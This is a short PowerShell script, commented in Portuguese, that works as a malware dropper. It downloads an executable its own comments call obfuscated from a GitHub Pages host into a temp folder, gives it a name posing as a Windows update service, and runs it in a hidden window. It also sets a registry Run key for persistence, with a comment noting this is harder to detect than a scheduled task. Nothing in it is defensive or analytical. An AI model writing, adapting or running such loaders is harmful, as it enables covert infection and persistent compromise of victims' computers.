# 1. Configurações de Caminho e Nomes
$folder = "$env:TEMP\WindowsCache"
$exePath = "$folder\winupdate_service.exe"
$url = "https://syslog992.github.io/sys-cache-update/winupdate_service.exe"

# 2. Cria a pasta silenciosamente
if (!(Test-Path $folder)) {
    New-Item -ItemType Directory -Force -Path $folder | Out-Null
}

# 3. Download do executável ofuscado
try {
    Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing
} catch {
    exit
}

# 4. Persistência via Registro (Mais difícil de detectar que Tarefa Agendada)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "WindowsUpdateService" -Value $exePath

# 5. Executa o programa agora mesmo
Start-Process -FilePath $exePath -WindowStyle Hidden
